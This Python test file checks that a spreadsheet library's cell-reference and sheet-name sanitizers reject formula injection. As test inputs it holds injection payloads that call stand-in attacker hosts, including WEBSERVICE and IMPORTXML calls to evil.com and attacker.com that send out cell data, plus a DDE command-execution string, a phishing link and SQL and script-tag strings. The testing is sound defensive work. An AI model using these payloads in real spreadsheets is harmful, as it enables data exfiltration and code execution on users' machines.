"""Tests for formula injection prevention.

Tests the formula sanitization functions that prevent formula injection attacks
via malicious cell references.
"""

from __future__ import annotations

import pytest

from spreadsheet_dl._builder.exceptions import FormulaError
from spreadsheet_dl._builder.formulas import (
    FormulaBuilder,
    sanitize_cell_ref,
    sanitize_sheet_name,
)


class TestCellReferenceSanitization:
    """Test cell reference validation and sanitization."""

    def test_valid_cell_references(self) -> None:
        """Test that valid cell references are accepted."""
        valid_refs = ["A1", "$A$1", "Z999", "$A1", "A$1", "AA10", "ZZ100"]
        for ref in valid_refs:
            result = sanitize_cell_ref(ref)
            assert result == ref

    def test_valid_range_references(self) -> None:
        """Test that valid range references are accepted."""
        valid_ranges = ["A1:B10", "$A$1:$B$10", "A:Z", "$A:$Z"]
        for ref in valid_ranges:
            result = sanitize_cell_ref(ref)
            assert result == ref

    def test_reject_injection_semicolon(self) -> None:
        """Test that semicolon injection is rejected."""
        with pytest.raises(FormulaError, match="Invalid characters"):
            sanitize_cell_ref('A1];WEBSERVICE("http://evil.com")')

    def test_reject_injection_parentheses(self) -> None:
        """Test that parentheses injection is rejected."""
        with pytest.raises(FormulaError, match="Invalid characters"):
            sanitize_cell_ref("A1);CALL_FUNC(")

    def test_reject_injection_quotes(self) -> None:
        """Test that quote injection is rejected."""
        with pytest.raises(FormulaError, match="Invalid cell reference"):
            sanitize_cell_ref('A1"malicious"')

    def test_reject_malformed_references(self) -> None:
        """Test that malformed references are rejected."""
        invalid_refs = ["123", "1A", "A", "!", "@A1", "A1B", "A1-B2"]
        for ref in invalid_refs:
            with pytest.raises(FormulaError, match="Invalid cell reference"):
                sanitize_cell_ref(ref)

    def test_whitespace_handling(self) -> None:
        """Test that whitespace is stripped but content validated."""
        result = sanitize_cell_ref("  A1  ")
        assert result == "A1"


class TestSheetNameSanitization:
    """Test sheet name validation."""

    def test_valid_sheet_names(self) -> None:
        """Test that valid sheet names are accepted."""
        valid_names = ["Sheet1", "Data_2025", "Sales Report", "Sheet_123"]
        for name in valid_names:
            result = sanitize_sheet_name(name)
            assert result == name

    def test_reject_special_characters(self) -> None:
        """Test that special characters are rejected."""
        invalid_names = ["Sheet;DROP", "Sheet'OR'1=1", 'Sheet"<script>']
        for name in invalid_names:
            with pytest.raises(FormulaError, match="Invalid sheet name"):
                sanitize_sheet_name(name)

    def test_whitespace_in_sheet_names(self) -> None:
        """Test that spaces are allowed in sheet names."""
        result = sanitize_sheet_name("My Sheet Name")
        assert result == "My Sheet Name"


class TestFormulaBuilderIntegration:
    """Test formula builder with security validation."""

    def test_formula_builder_validates_references(self) -> None:
        """Test that FormulaBuilder validates cell references."""
        fb = FormulaBuilder()

        # Valid reference works
        formula = fb.sum("A1:A10")
        assert "SUM" in formula

        # Invalid reference raises error
        with pytest.raises(FormulaError):
            fb.sum('A1];WEBSERVICE("http://evil.com")')

    def test_formula_builder_safe_operations(self) -> None:
        """Test that common formula operations are safe."""
        fb = FormulaBuilder()

        # These should all work safely
        formulas = [
            fb.sum("A1:A10"),
            fb.average("B1:B10"),
            fb.multiply("C1", "D1"),
            fb.if_expr("E1>0", "E1", "0"),
        ]

        for formula in formulas:
            assert formula.startswith("of:=")
            assert ";" not in formula or "IF" in formula  # Only IF uses semicolons

    def test_real_world_injection_attempts(self) -> None:
        """Test real-world formula injection attack patterns."""
        fb = FormulaBuilder()

        attack_patterns = [
            'A1];DDE("cmd";"/c calc";"!")',
            'A1];IMPORTXML("http://evil.com/data.xml";"//data")',
            'A1];WEBSERVICE("http://attacker.com?data="&A1)',
            'A1];HYPERLINK("http://phishing.com")',
        ]

        for pattern in attack_patterns:
            with pytest.raises(FormulaError):
                fb.sum(pattern)


class TestFormulaSecurityEdgeCases:
    """Test edge cases in formula security."""

    def test_empty_reference(self) -> None:
        """Test that empty references are rejected."""
        with pytest.raises(FormulaError):
            sanitize_cell_ref("")

    def test_only_whitespace(self) -> None:
        """Test that whitespace-only references are rejected."""
        with pytest.raises(FormulaError):
            sanitize_cell_ref("   ")

    def test_unicode_injection(self) -> None:
        """Test that unicode injection attempts are rejected."""
        with pytest.raises(FormulaError):
            sanitize_cell_ref("A1\u0000malicious")

    def test_case_sensitivity(self) -> None:
        """Test that cell references are case-sensitive for columns."""
        # Uppercase columns are valid
        assert sanitize_cell_ref("A1") == "A1"
        assert sanitize_cell_ref("AA1") == "AA1"

        # Lowercase columns are invalid
        with pytest.raises(FormulaError):
            sanitize_cell_ref("a1")
